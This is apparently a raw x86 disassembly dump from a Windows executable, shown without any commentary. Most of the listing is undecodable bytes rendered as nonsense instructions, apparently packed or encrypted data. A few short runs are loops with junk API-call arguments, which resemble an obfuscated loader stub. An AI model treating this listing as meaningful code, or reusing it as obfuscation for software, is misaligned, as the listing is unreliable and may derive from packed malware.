  4127ec:	dec    esp
  4127ed:	cmp    al,0x79
  4127ef:	cmp    dh,BYTE PTR [eax]
  4127f1:	shr    BYTE PTR [ecx-0x5e497190],0xb
  4127f8:	mov    cl,BYTE PTR [esp+ebx*8+0x6b8be940]
  4127ff:	mov    esi,0xfb782574
  412804:	xchg   edx,eax
  412805:	mov    ebp,0x73fc8035
  41280a:	mov    DWORD PTR ds:0x7b20caab,ecx
  412810:	(bad)  
  412811:	ja     0x412883
  412813:	mov    eax,0x897be471
  412818:	gs mov cl,0xad
  41281b:	sbb    BYTE PTR [ebx-0x29],cl
  41281e:	shr    BYTE PTR [ebx],0xc6
  412821:	dec    edx
  412822:	mov    dh,0x57
  412824:	jmp    0x4127de
  412826:	loop   0x41283c
  412828:	rcr    BYTE PTR [ebx+ecx*2],1
  41282b:	mov    DWORD PTR [eax+edi*1-0x28],esi
  41282f:	pop    ebp
  412830:	aas    
  412831:	rcr    DWORD PTR [ebp-0x3c3077e9],1
  412837:	dec    edx
  412838:	js     0x412831
  41283a:	bound  ebp,QWORD PTR [ecx+eax*4-0x2282596a]
  412841:	adc    edx,ebx
  412843:	xchg   ebx,eax
  412844:	cli    
  412845:	aad    0xfa
  412847:	add    DWORD PTR [edx+0x56],eax
  41284a:	or     eax,0x20ba0ed8
  41284f:	push   cs
  412850:	mov    dh,0x1c
  412852:	sub    dh,bl
  412854:	fidivr DWORD PTR [ebp+0x50]
  412857:	stc    
  412858:	add    al,0x8b
  41285a:	fdivr  DWORD PTR [ebp+0x2227ea54]
  412860:	out    dx,eax
  412861:	jno    0x41282c
  412863:	jle    0x41281e
  412865:	xchg   ecx,eax
  412866:	aaa    
  412867:	das    
  412868:	out    dx,eax
  412869:	popa   
  41286a:	repz push es
  41286c:	(bad)  
  41286d:	sub    edi,DWORD PTR [edi]
  41286f:	lea    esp,cs:[eax]
  412872:	push   ss
  412873:	push   0x29
  412875:	call   0x37162379
  41287a:	mov    eax,0xdf9cf7
  41287f:	call   0x9d13fafc
  412884:	fs push ss
  412886:	mov    ebx,0xdfd89115
  41288b:	mov    eax,ds:0x3559b7c7
  412890:	pop    edi
  412891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412892:	lock into 
  412894:	repz mov cl,0x38
  412897:	dec    ecx
  412898:	ret    0xf570
  41289b:	jb     0x412897
  41289d:	test   BYTE PTR [edx+eiz*8-0x59],0x39
  4128a2:	imul   esp,esi,0xdbf5e739
  4128a8:	outs   dx,BYTE PTR ds:[esi]
  4128a9:	dec    eax
  4128aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128ab:	mov    ?,WORD PTR [edi-0x6f]
  4128ae:	outs   dx,BYTE PTR ds:[esi]
  4128af:	xchg   BYTE PTR [ebx*8-0x1e7a6b2e],dh
  4128b6:	(bad)  
  4128b7:	mov    dh,0xfb
  4128b9:	mov    ch,0x4f
  4128bb:	push   edx
  4128bc:	std    
  4128bd:	sub    DWORD PTR [ebx+ebp*1+0x669233fd],ebp
  4128c4:	out    0xa8,al
  4128c6:	popa   
  4128c7:	xchg   BYTE PTR [ebx-0x29],dh
  4128ca:	pop    ss
  4128cb:	pop    esp
  4128cc:	sub    al,0x1e
  4128ce:	mov    dl,0x7
  4128d0:	xor    DWORD PTR [ebp+ecx*2-0x1cf4fb50],ebx
  4128d7:	mov    ch,dl
  4128d9:	dec    eax
  4128da:	loopne 0x41288b
  4128dc:	push   ds
  4128dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128de:	loopne 0x412940
  4128e0:	mov    dh,0xc0
  4128e2:	hlt    
  4128e3:	ret    0x50a0
  4128e6:	out    0x9a,al
  4128e8:	ins    BYTE PTR es:[edi],dx
  4128e9:	mov    dl,0xd9
  4128eb:	movntq QWORD PTR [eax+0x27ec4501],mm4
  4128f2:	lods   eax,DWORD PTR ds:[esi]
  4128f3:	lahf   
  4128f4:	and    esp,DWORD PTR [edi-0x3e]
  4128f7:	xchg   ebx,eax
  4128f8:	dec    eax
  4128f9:	mov    ds:0x5a1d595,al
  4128fe:	icebp  
  4128ff:	sub    edx,DWORD PTR [edi]
  412901:	adc    al,0xea
  412903:	mov    bl,0xaa
  412905:	(bad)
  412908:	xchg   ebp,eax
  412909:	out    0x63,eax
  41290b:	fnstsw WORD PTR [edx-0x5483250d]
  412911:	shl    DWORD PTR [edx-0x52],cl
  412914:	push   0xddf646a1
  412919:	pop    esp
  41291a:	gs pushf 
  41291c:	fbld   TBYTE PTR [eax-0x23]
  41291f:	pop    ds
  412920:	xchg   ebx,eax
  412921:	pusha  
  412922:	enter  0x3224,0x93
  412926:	test   al,0x7e
  412928:	add    eax,0x94105312
  41292d:	cmp    eax,DWORD PTR [ecx-0x65]
  412930:	and    al,0xa2
  412932:	cli    
  412933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412934:	nop
  412935:	iret   
  412936:	lock add bh,BYTE PTR [ebp+0x57]
  41293a:	lds    ebp,FWORD PTR [edi+0x51]
  41293d:	xchg   esp,eax
  41293e:	rol    BYTE PTR [edx+edi*2+0x3973977c],cl
  412945:	sub    dl,BYTE PTR [esi+ebx*1+0x18]
  412949:	xchg   BYTE PTR [edx-0x28bb08cc],al
  41294f:	hlt    
  412950:	cs loopne 0x412906
  412953:	repz rcr ch,0x88
  412957:	aad    0x52
  412959:	scas   al,BYTE PTR es:[edi]
  41295a:	xchg   DWORD PTR ds:[ecx],eax
  41295d:	jg     0x41299a
  41295f:	jmp    0xa4164a97
  412964:	and    DWORD PTR [edi],ecx
  412966:	inc    esi
  412967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412968:	inc    edi
  412969:	imul   eax,DWORD PTR [edi+0x319a6a21],0x5483c87a
  412973:	add    al,BYTE PTR [edi]
  412975:	and    cl,BYTE PTR [esi-0x36]
  412978:	gs mov al,0x91
  41297b:	dec    ecx
  41297c:	outs   dx,DWORD PTR ds:[esi]
  41297d:	ins    DWORD PTR es:[edi],dx
  41297e:	jno    0x4129d4
  412980:	mov    esp,0x43fce97b
  412985:	nop
  412986:	cli    
  412987:	push   0x37
  412989:	retf   0xb4ad
  41298c:	call   0x6c5a:0xca2143e4
  412993:	loope  0x4129da
  412995:	std    
  412996:	arpl   WORD PTR [esi+0x691ac308],cx
  41299c:	cdq    
  41299d:	retf   
  41299e:	pop    ebx
  41299f:	int    0xd0
  4129a1:	fld    QWORD PTR [ecx-0x7d]
  4129a4:	loop   0x4129b0
  4129a6:	fmul   st,st(5)
  4129a8:	mov    cl,0x44
  4129aa:	jmp    0x412a17
  4129ac:	mov    eax,ds:0xbd00b8bb
  4129b1:	imul   edi,DWORD PTR [ecx*4+0x1bea6075],0xd9f0627c
  4129bc:	mov    eax,ds:0x34c78ca9
  4129c1:	inc    ebp
  4129c2:	pop    ds
  4129c3:	cwde   
  4129c4:	mov    esi,0xaf16f5a8
  4129c9:	mov    ecx,0xc0df1b8f
  4129ce:	push   esp
  4129cf:	rep cs stos DWORD PTR es:[edi],eax
  4129d2:	pop    esp
  4129d3:	inc    ebp
  4129d4:	ficomp DWORD PTR [ebx+0x57cbc3d5]
  4129da:	into   
  4129db:	xchg   BYTE PTR [edi],dh
  4129dd:	jnp    0x412a49
  4129df:	jp     0x4129f3
  4129e1:	pop    edx
  4129e2:	iret   
  4129e3:	cmp    DWORD PTR [ebp+0x48],edi
  4129e6:	fs mov esp,cr3
  4129ea:	push   ss
  4129eb:	and    esi,DWORD PTR [eax+esi*8+0x27fed9b0]
  4129f2:	dec    esp
  4129f3:	int3   
  4129f4:	or     ch,BYTE PTR [esi-0x69]
  4129f7:	add    eax,0xcdba5818
  4129fc:	push   eax
  4129fd:	jle    0x4129c4
  4129ff:	mov    al,ds:0xb2e87055
  412a04:	js     0x412a78
  412a06:	or     edi,edi
  412a08:	push   0xfffffffd
  412a0a:	sbb    al,0x12
  412a0c:	add    BYTE PTR [ecx+0x5b306262],bl
  412a12:	cwde   
  412a13:	cmp    BYTE PTR [ecx+0x555c8c3d],ch
  412a19:	xor    al,0x64
  412a1b:	mov    dl,0xc3
  412a1d:	pop    esi
  412a1e:	test   edx,edx
  412a20:	test   BYTE PTR [ebx-0x3e4388fb],al
  412a26:	cmc    
  412a27:	sbb    eax,0x415486d6
  412a2c:	and    edi,DWORD PTR ds:[ebx+esi*4]
  412a30:	pop    ss
  412a31:	adc    eax,ebp
  412a33:	stos   BYTE PTR es:[edi],al
  412a34:	push   0xfffffff0
  412a36:	jnp    0x412a77
  412a38:	mov    dl,0x83
  412a3a:	cmp    ebp,DWORD PTR [esi]
  412a3c:	inc    esi
  412a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a3e:	sbb    al,0xf4
  412a40:	inc    esp
  412a41:	stc    
  412a42:	sub    DWORD PTR ds:0x8c1969c6,edi
  412a48:	push   ecx
  412a49:	jae    0x412a93
  412a4b:	out    dx,al
  412a4c:	call   FWORD PTR [edx]
  412a4e:	push   ds
  412a4f:	call   0x659dc84f
  412a54:	fnsave [ebx+edi*8-0x559c972c]
  412a5b:	ss dec eax
  412a5d:	aam    0xad
  412a5f:	sbb    eax,0x4be743a8
  412a64:	dec    esi
  412a65:	aad    0xe7
  412a67:	inc    ebp
  412a68:	push   0xfda122d9
  412a6d:	jl     0x412ad4
  412a6f:	xor    esp,DWORD PTR [eax-0x5f]
  412a72:	cmp    dl,BYTE PTR [edi-0x3d]
  412a75:	sub    eax,0x9e8a78d4
  412a7a:	test   al,0x54
  412a7c:	sbb    al,0xdf
  412a7e:	pop    es
  412a7f:	dec    ebp
  412a80:	dec    esi
  412a81:	dec    esi
  412a82:	jb     0x412a42
  412a84:	imul   ebx,DWORD PTR [eax+eax*1-0x52],0x22
  412a89:	icebp  
  412a8a:	bound  ebx,QWORD PTR [ecx+0xcbf3b4f]
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e220
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fdf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fdf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fdf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e417
  412af1:	mov    edi,DWORD PTR ds:0x42fdf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fdf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e228
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e218,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b4d
  412b3b:	ss pop ecx
  412b3d:	push   0x70706611
  412b42:	mov    ecx,0xaf70707e
  412b47:	xchg   esp,eax
  412b48:	div    BYTE PTR [edx-0x5a]
  412b4b:	pop    esi
  412b4c:	aam    0x10
  412b4e:	cdq    
  412b4f:	int3   
  412b50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b51:	mov    WORD PTR [edx],fs
  412b53:	in     eax,0xdc
  412b55:	mov    bh,0xf2
  412b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b58:	mov    esp,0x866ddab6
  412b5d:	sbb    bl,bl
  412b5f:	inc    edx
  412b60:	mov    ebx,0x8230eb9d
  412b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b66:	cwde   
  412b67:	push   edx
  412b68:	mov    edi,0x59830698
  412b6d:	in     eax,dx
  412b6e:	iret   
  412b6f:	xor    BYTE PTR [ebp-0x1c442574],bl
  412b75:	mov    esi,?
  412b77:	daa    
  412b78:	bound  eax,QWORD PTR [edx-0x6b]
  412b7b:	push   edx
  412b7c:	xor    DWORD PTR [edi],ebp
  412b7e:	add    BYTE PTR [ebx+0x9],dh
  412b81:	fiadd  WORD PTR [edx+0xc8bddb7]
  412b87:	xchg   ebx,eax
  412b88:	(bad)  
  412b89:	in     al,dx
  412b8a:	adc    eax,0xde808deb
  412b8f:	mov    eax,ds:0xea262a3
  412b94:	and    al,0x82
  412b96:	xchg   DWORD PTR [ecx+0x384ba15f],ecx
  412b9c:	jge    0x412bac
  412b9e:	(bad)  
  412b9f:	pop    esi
  412ba0:	call   0x9002:0x9321832f
  412ba7:	push   0x5d
  412ba9:	addr16 or ch,dl
  412bac:	leave  
  412bad:	iret   
  412bae:	sbb    ebx,edx
  412bb0:	sub    ebx,ecx
  412bb2:	sub    dl,ch
  412bb4:	jl     0x412bfc
  412bb6:	(bad)  
  412bb7:	ret    
  412bb8:	jne    0x412bbc
  412bba:	adc    al,ah
  412bbc:	fild   QWORD PTR [edx]
  412bbe:	mov    edi,DWORD PTR [eax]
  412bc0:	push   eax
  412bc1:	cdq    
  412bc2:	sar    BYTE PTR [esi+0x45b1fcfd],0x71
  412bc9:	loope  0x412b6f
  412bcb:	add    ecx,edx
  412bcd:	mov    eax,0xaa4a8a83
  412bd2:	stc    
  412bd3:	or     eax,0x960c4518
  412bd8:	dec    ecx
  412bd9:	inc    ebp
  412bda:	cmp    eax,ecx
  412bdc:	in     eax,dx
  412bdd:	daa    
  412bde:	and    esp,ebx
  412be0:	mov    ebx,0x2a22da17
  412be5:	and    bl,BYTE PTR [esp+eax*8-0x73a5c777]
  412bec:	(bad)  
  412bed:	xchg   edx,eax
  412bee:	js     0x412c19
  412bf0:	inc    edx
  412bf1:	ins    BYTE PTR es:[edi],dx
  412bf2:	push   0xffffffce
  412bf4:	xchg   esi,eax
  412bf5:	or     BYTE PTR [esi+0x2a],ah
  412bf8:	pop    ebx
  412bf9:	mov    ecx,0xfdcf2bb9
  412bfe:	mov    BYTE PTR [ebx],dh
  412c00:	outs   dx,DWORD PTR ds:[esi]
  412c01:	(bad)  
  412c02:	adc    ebp,DWORD PTR [eax]
  412c04:	popa   
  412c05:	xchg   BYTE PTR [ecx],bh
  412c07:	mov    eax,0xca39ae4f
  412c0c:	(bad)
  412c0f:	jns    0x412c2c
  412c11:	in     al,0xde
  412c13:	loopne 0x412bf3
  412c15:	outs   dx,DWORD PTR ds:[esi]
  412c16:	(bad)  [ecx-0x1d960c28]
  412c1c:	adc    edx,DWORD PTR [edi+0x5a]
  412c1f:	retw   
  412c21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c22:	jnp    0x412bca
  412c24:	cvtps2pi mm1,xmm5
  412c27:	jmp    0x9d1cf640
  412c2c:	cli    
  412c2d:	cmp    al,0xcb
  412c2f:	pop    esi
  412c30:	dec    ebp
  412c31:	sbb    eax,edx
  412c33:	stos   BYTE PTR es:[edi],al
  412c34:	dec    edi
  412c35:	inc    esi
  412c36:	inc    edi
  412c37:	cmp    al,0x78
  412c39:	sbb    eax,0xfa4b0c96
  412c3e:	mov    eax,ds:0x5da245b0
  412c43:	or     BYTE PTR [esi-0x6ccf71df],0x84
  412c4a:	sbb    ebx,edi
  412c4c:	xchg   edx,eax
  412c4d:	jge    0x412c50
  412c4f:	jns    0x412c57
  412c51:	adc    ah,BYTE PTR [ebx+0x2612522d]
  412c57:	ds dec esi
  412c59:	hlt    
  412c5a:	pusha  
  412c5b:	pop    esi
  412c5c:	hlt    
  412c5d:	mov    dh,0x6a
  412c5f:	push   ds
  412c60:	xchg   esi,eax
  412c61:	inc    eax
  412c62:	dec    esi
  412c63:	rol    BYTE PTR [esi+ebp*1],1
  412c66:	inc    esp
  412c67:	mov    ?,WORD PTR [ebx-0x22]
  412c6a:	inc    esi
  412c6b:	and    DWORD PTR [esi+0x654af552],0xffffffc4
  412c72:	aas    
  412c73:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  412c75:	cmp    eax,0xb2c5fb57
  412c7a:	cmp    al,0x8b
  412c7c:	push   ecx
  412c7d:	push   es
  412c7e:	push   esi
  412c7f:	push   edi
  412c80:	mov    cs,edi
  412c82:	xor    bh,BYTE PTR ds:0xc864c26b
  412c88:	mov    edi,0xfc026187
  412c8d:	push   esp
  412c8e:	push   0xd
  412c90:	push   edx
  412c91:	shl    bh,1
  412c93:	mov    edx,ebx
  412c95:	mov    ah,0x1f
  412c97:	pushf  
  412c98:	ficomp WORD PTR [edi]
  412c9a:	mov    edi,0xca51294d
  412c9f:	jno    0x412cf4
  412ca1:	mov    cl,0xed
  412ca3:	xchg   ebx,edx
  412ca5:	xchg   ebp,eax
  412ca6:	dec    esp
  412ca7:	test   DWORD PTR ds:0xd6e5ccf8,ecx
  412cad:	pop    edx
  412cae:	jl     0x412d13
  412cb0:	js     0x412c48
  412cb2:	push   ecx
  412cb3:	test   BYTE PTR [esi-0x53420d27],0x27
  412cba:	or     al,0xc1
  412cbc:	mov    edi,0xff33fd7f
  412cc1:	dec    esp
  412cc2:	fwait
  412cc3:	mov    ?,WORD PTR [edx+0x7b]
  412cc6:	aam    0xdb
  412cc8:	js     0x412d32
  412cca:	shl    dh,0x3d
  412ccd:	push   ebx
  412cce:	sbb    eax,0x663ce47a
  412cd3:	jg     0x412c58
  412cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cd6:	xor    eax,0x8d5b94dd
  412cdb:	outs   dx,DWORD PTR ds:[esi]
  412cdc:	icebp  
  412cdd:	rcr    esi,0xb2
  412ce0:	add    DWORD PTR [ebp+0x773b51b6],edx
  412ce6:	es idiv edx
  412ce9:	sbb    al,0xe3
  412ceb:	inc    esi
  412cec:	dec    ebx
  412ced:	and    DWORD PTR [esi],eax
  412cef:	out    0xe2,eax
  412cf1:	dec    ebx
  412cf2:	mov    ds:0xbc59aa10,eax
  412cf7:	or     edi,0x62
  412cfa:	iret   
  412cfb:	ret    
  412cfc:	clc    
  412cfd:	xor    BYTE PTR [edx-0x218645a5],dl
  412d03:	inc    ebp
  412d04:	dec    eax
  412d05:	out    0x1e,eax
  412d07:	mov    ds,WORD PTR ds:0x54043cc7
  412d0d:	outs   dx,BYTE PTR ds:[esi]
  412d0e:	xor    al,0x8d
  412d10:	stos   DWORD PTR es:[edi],eax
  412d11:	cmp    DWORD PTR [ebx+esi*1-0x1c],eax
  412d15:	add    al,0x86
  412d17:	mov    ds:0xd20301af,al
  412d1c:	shr    DWORD PTR [ebx],1
  412d1e:	in     al,0x20
  412d20:	push   ebx
  412d21:	pop    edx
  412d22:	adc    eax,0x46e58af0
  412d27:	and    BYTE PTR [esi-0x19],cl
  412d2a:	cli    
  412d2b:	mov    al,0x2a
  412d2d:	aaa    
  412d2e:	pop    edi
  412d2f:	lds    ecx,FWORD PTR [edx+0x12]
  412d32:	push   esp
  412d33:	xchg   ebx,eax
  412d34:	popf   
  412d35:	out    0xb8,eax
  412d37:	jg     0x412da2
  412d39:	pop    eax
  412d3a:	div    DWORD PTR [ebp+0x4c]
  412d3d:	mov    al,ds:0xe3b055f3
  412d42:	shr    BYTE PTR [ebx-0x1],cl
  412d45:	mov    edi,ebx
  412d47:	aas    
  412d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d49:	popf   
  412d4a:	push   edx
  412d4b:	adc    bl,cl
  412d4d:	jmp    0x412d64
  412d4f:	push   ss
  412d50:	jb     0x412d05
  412d52:	push   eax
  412d53:	hlt    
  412d54:	loope  0x412cdb
  412d56:	cdq    
  412d57:	mov    eax,ds:0x2ced115e
  412d5c:	test   eax,0x53fcdee7
  412d61:	push   es
  412d62:	jmp    0xebd8995f
  412d67:	pop    ebp
  412d68:	(bad)  
  412d69:	(bad)  
  412d6a:	rol    BYTE PTR [edx],cl
  412d6c:	jmp    0x9004:0xe6eecc75
  412d73:	stos   DWORD PTR es:[edi],eax
  412d74:	aas    
  412d75:	xor    ch,bl
  412d77:	gs pop ecx
  412d79:	push   esi
  412d7a:	cwde   
  412d7b:	and    eax,DWORD PTR [ebp+0x45]
  412d7e:	shl    DWORD PTR [edx-0x24],1
  412d81:	cmc    
  412d82:	fild   DWORD PTR [edx+esi*4+0x48]
  412d86:	lods   eax,DWORD PTR ds:[esi]
  412d87:	cs test ch,0xa4
  412d8b:	test   BYTE PTR [ebp+0xf],bl
  412d8e:	test   eax,0x6a8b68de
  412d93:	or     eax,0xad318521
  412d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d99:	xor    al,0x40
  412d9b:	stc    
  412d9c:	push   0xffffff86
  412d9e:	and    edx,DWORD PTR [esi]
  412da0:	addr16 mov ah,0x21
  412da3:	das    
  412da4:	test   al,0x2d
  412da6:	addr16 nop
  412da8:	(bad)  
  412da9:	repnz ror BYTE PTR [edi+0x30],cl
  412dad:	push   ecx
  412dae:	mov    eax,DWORD PTR [ebx]
  412db0:	xchg   bp,ax
  412db2:	sub    dh,ah
  412db4:	enter  0xa50f,0xf1
  412db8:	fldcw  WORD PTR [esi+0x68]
  412dbb:	das    
  412dbc:	fdiv   QWORD PTR [edx+0x555fe7e3]
  412dc2:	mov    bl,0x8f
  412dc4:	push   cs
  412dc5:	scas   eax,DWORD PTR es:[edi]
  412dc6:	jmp    0x31c31b5a
  412dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dcc:	adc    al,0xd9
  412dce:	dec    edi
  412dcf:	mov    cl,0x89
  412dd1:	out    dx,al
  412dd2:	int    0x26
  412dd4:	ins    BYTE PTR es:[edi],dx
  412dd5:	xor    DWORD PTR [esp+ecx*4+0x66c363fb],esp
  412ddc:	xor    bl,BYTE PTR [edi]
  412dde:	push   esi
  412ddf:	repz std 
  412de1:	mov    al,0xc7
  412de3:	cld    
  412de4:	xchg   esi,eax
  412de5:	pop    ebp
  412de6:	mov    BYTE PTR [ebx-0x3acec9c3],ah
  412dec:	das    
  412ded:	xchg   edi,eax
  412dee:	das    
  412def:	jne    0x412e1f
  412df1:	jge    0x412dc8
  412df3:	adc    al,0xc4
  412df5:	lods   eax,DWORD PTR ds:[esi]
  412df6:	sbb    BYTE PTR [ebp-0x344f38a6],dh
  412dfc:	push   esi
  412dfd:	fstp   TBYTE PTR [esi]
  412dff:	dec    ebp
  412e00:	cmp    BYTE PTR [ebx+ebx*2],dl
  412e03:	inc    edi
  412e04:	xor    eax,0xa3ec4c4b
  412e09:	les    ebx,FWORD PTR [eax+0x3b]
  412e0c:	cmp    al,0x87
  412e0e:	into   
  412e0f:	and    DWORD PTR ds:0x42e21c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e21c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e21c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e21c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e21c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e587
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ebp+0x9],dx
  412e77:	jmp    0x70a58949
  412e7c:	jo     0x412e37
  412e7e:	jle    0x412ef0
  412e80:	jo     0x412e94
  412e82:	mov    esi,0x11c090e1
  412e87:	arpl   WORD PTR [ebx+0x1a1f9ba3],bp
  412e8d:	fwait
  412e8e:	out    dx,eax
  412e8f:	pop    ecx
  412e90:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  412e92:	adc    esi,eax
  412e94:	mul    edi
  412e96:	push   ss
  412e97:	xchg   DWORD PTR [ecx+0x23],eax
  412e9a:	push   cs
  412e9b:	jno    0x412ee2
  412e9d:	retf   
  412e9e:	sahf   
  412e9f:	arpl   ax,bx
  412ea1:	dec    ebp
  412ea2:	sub    al,0xbc
  412ea4:	loop   0x412edb
  412ea6:	scas   eax,DWORD PTR es:[edi]
  412ea7:	pop    ss
  412ea8:	xchg   esp,eax
  412ea9:	dec    ebp
  412eaa:	in     al,dx
  412eab:	retf   0xc349
  412eae:	xchg   esi,eax
  412eaf:	mov    esp,0x46de6e1b
  412eb4:	imul   ecx,edx,0xffffffed
  412eb7:	adc    DWORD PTR [ebx-0x57a800bd],eax
  412ebd:	into   
  412ebe:	repz pop esp
  412ec0:	mov    dl,0x79
  412ec2:	add    BYTE PTR [ecx+0x6],al
  412ec5:	mov    ebx,0x58a1ad9d
  412eca:	rep lods al,BYTE PTR ds:[esi]
  412ecc:	imul   ebx,DWORD PTR [esp+edx*4-0x5be12887],0x459a7eb7
  412ed7:	jle    0x412eb2
  412ed9:	cwde   
  412eda:	push   cs
  412edb:	pop    ecx
  412edc:	adc    dh,BYTE PTR [esi-0x55b23045]
  412ee2:	lods   eax,DWORD PTR ds:[esi]
  412ee3:	inc    esp
  412ee4:	pop    esp
  412ee5:	jle    0x412f5f
  412ee7:	cmp    edx,ecx
  412ee9:	xor    edx,DWORD PTR [esi]
  412eeb:	out    0xce,al
  412eed:	jecxz  0x412e73
  412eef:	int    0xa
  412ef1:	push   0xffffffbe
  412ef3:	jecxz  0x412f02
  412ef5:	outs   dx,BYTE PTR ds:[esi]
  412ef6:	cmc    
  412ef7:	xor    ebp,0xec4b66c8
  412efd:	push   0xe3a68383
  412f02:	sar    ecx,cl
  412f04:	sbb    al,0x3c
  412f06:	ret    0x2cec
  412f09:	push   esp
  412f0a:	loop   0x412e8e
  412f0c:	pop    ss
  412f0d:	jmp    FWORD PTR [edi]
  412f0f:	or     DWORD PTR [ebx+0x44],ebx
  412f12:	dec    eax
  412f13:	xchg   esi,eax
  412f14:	sti    
  412f15:	int    0x1d
  412f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f18:	sahf   
  412f19:	mov    eax,0x83ed289
  412f1e:	loopne 0x412f21
  412f20:	loope  0x412f12
  412f22:	pop    edi
  412f23:	fdivr  QWORD PTR [eax+0x50b591c8]
  412f29:	jge    0x412f9d
  412f2b:	dec    ebx
  412f2c:	push   ss
  412f2d:	addr16 pusha 
  412f2f:	jmp    0x775e:0x411250f8
  412f36:	ret    
  412f37:	push   cs
  412f38:	ss sub ah,cl
  412f3b:	ret    0x7459
  412f3e:	out    0xba,eax
  412f40:	in     al,0xd9
  412f42:	jle    0x412ed7
  412f44:	cmp    DWORD PTR [edx+ebp*8+0x468a6fc4],ebp
  412f4b:	je     0x412f78
  412f4d:	xchg   ecx,eax
  412f4e:	rcr    BYTE PTR [ecx+0x4d],cl
  412f51:	repz into 
  412f53:	outs   dx,BYTE PTR ds:[esi]
  412f54:	dec    esp
  412f55:	jno    0x412fa2
  412f57:	call   0x4c8e51e5
  412f5c:	push   ebx
  412f5d:	push   ebx
  412f5e:	gs (bad) 
  412f60:	adc    eax,0x2f92f2c0
  412f65:	dec    esi
  412f66:	mov    ds:0xeaf8e995,al
  412f6b:	fcmovb st,st(7)
  412f6d:	enter  0x1998,0x21
  412f71:	daa    
  412f72:	jns    0x412f73
  412f74:	jmp    0x60b068f6
  412f79:	loope  0x412feb
  412f7b:	mov    edx,0x789fa83
  412f80:	push   ss
  412f81:	xchg   ecx,eax
  412f82:	mov    bh,0xc0
  412f84:	add    bl,BYTE PTR [eax+0x44135e13]
  412f8a:	out    0xf7,al
  412f8c:	out    0xd0,eax
  412f8e:	fadd   QWORD PTR [esp+edi*2-0x505d8ea]
  412f95:	jne    0x412f57
  412f97:	add    cl,bh
  412f99:	mov    esp,0x9dd0409c
  412f9e:	call   0x3e:0x47260a15
  412fa5:	pushf  
  412fa6:	mov    esi,0xca106ee8
  412fab:	mov    dh,0x54
  412fad:	push   es
  412fae:	retf   0x16c6
  412fb1:	sbb    BYTE PTR [ecx-0x6b],cl
  412fb4:	and    dh,0x27
  412fb7:	dec    esp
  412fb8:	shl    eax,cl
  412fba:	dec    ebx
  412fbb:	sbb    BYTE PTR ds:[ebx+0x5df2c22f],dl
  412fc2:	loop   0x412fdf
  412fc4:	bnd jg 0x412f91
  412fc7:	and    BYTE PTR [ecx+0x1a],cl
  412fca:	rcl    BYTE PTR [esi-0x7b],cl
  412fcd:	cwde   
  412fce:	bound  edx,QWORD PTR [eax]
  412fd0:	sub    eax,0x2a1ba20d
  412fd5:	leave  
  412fd6:	(bad)  
  412fd8:	sub    ch,BYTE PTR [edi-0x39e2c6a2]
  412fde:	and    DWORD PTR [ecx+eiz*2-0xc],0xffffffc3
  412fe3:	ficomp DWORD PTR [edx+0x13]
  412fe6:	mov    dl,0x26
  412fe8:	fld    st(0)
  412fea:	aaa    
  412feb:	and    si,ax
  412fee:	dec    eax
  412fef:	adc    eax,DWORD PTR [ebp+0x39]
  412ff2:	enter  0xd03a,0x38
  412ff6:	bound  ecx,QWORD PTR [edi-0x4b9108e]
  412ffc:	jecxz  0x412fa6
  412ffe:	out    0x43,al
  413000:	mov    al,ds:0x96bc1cef
